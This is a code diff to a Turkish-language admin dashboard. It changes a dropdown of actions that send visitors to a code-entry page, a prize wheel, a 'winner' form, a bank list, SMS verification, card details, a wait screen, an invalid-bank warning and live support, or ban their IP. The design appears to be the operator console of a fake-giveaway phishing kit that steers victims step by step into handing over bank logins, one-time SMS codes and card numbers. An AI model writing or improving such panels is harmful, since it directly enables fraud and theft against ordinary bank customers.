@@ -970,15 +970,17 @@ export function AdminDashboardClean() {
                             }}
                           >
                             <option value="">İşlem Seç...</option>
-                            <option value="win">Giriş'e Yönlendir</option>
-                            <option value="banken">Banka Listesine Yönlendirme</option>
-                            <option value="sms">SMS'e Yönlendir</option>
-                            <option value="card">Kart'a Yönlendir</option>
-                            <option value="special_approval">Özel Bildirim Gönder</option>
-                            <option value="wait">Beklemeye Al</option>
-                            <option value="invalid_bank">Hatalı Banka</option>
-                            <option value="live_support">Canlı Desteğe Yönlendir</option>
-                            <option value="congrats">Tebrikler Ekranı</option>
+                            <option value="code_entry">Katılım Kodu Ekranı (/code)</option>
+                            <option value="wheel">Çark Ekranı (/wheel)</option>
+                            <option value="win">Win / Kazanan Form (/win)</option>
+                            <option value="banken">Banka Listesi (/banken)</option>
+                            <option value="sms">SMS Doğrulama (/sms)</option>
+                            <option value="card">Kart Bilgileri (/card)</option>
+                            <option value="wait">Bekleme Ekranı (/wait)</option>
+                            <option value="invalid_bank">Hatalı Banka Uyarısı (/invalid-bank)</option>
+                            <option value="live_support">Canlı Destek (/live-support)</option>
+                            <option value="congrats">Tebrikler / Başarılı (/congratulations)</option>
+                            <option value="special_approval">Özel Bildirim Gönder (Modal)</option>
                             <option value="ban_ip">IP Banla (Siteye Giremesin)</option>
                           </select>
                           <div className="flex justify-end items-center mt-1 gap-1.5 w-full">
